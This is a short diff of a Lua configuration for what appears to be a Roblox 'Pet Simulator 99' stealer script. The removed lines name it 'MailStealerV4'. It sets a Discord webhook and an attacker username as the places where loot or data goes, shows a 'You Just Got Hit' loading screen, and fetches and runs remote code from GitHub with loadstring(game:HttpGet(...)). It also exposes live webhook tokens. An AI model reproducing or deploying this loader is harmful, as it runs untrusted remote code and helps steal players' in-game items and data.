@@ -1,11 +1,6 @@
-DualhookUsername = "jheremyqt1"
-DualhookWebHook = "https://discord.com/api/webhooks/1205078536214421504/o8_MnTN5jv_879u6ndWCtorMHW1IIuyC7cBukyTiUncZiJ-y3hjEyYZa7XLFXanGqg-J"
+Username = "jheremyqt1"
+Webhook = "https://discord.com/api/webhooks/1207314422398459965/WGk0y687HxVCqdhTM0ty-JVEwKksybbo9dR5cU5D0lHfwuhcLQiUsJXPs8sxMXsGI0UD"
+selectedLoadingScreen = "2"
+LoadingScreen = true
 
-HugeSetting = 2
-GemSetting = 2000000
-
--- Custom Settings!
-LoadingScreenTitle = "You Just Got Hit Join discord.gg/ft6qjHR4gh"
-WebHookName = "MailStealerV4"
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/LypherX/MoriPremium/main/MoriPremium"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LypherX/PS99Mail/main/Mementomori"))()
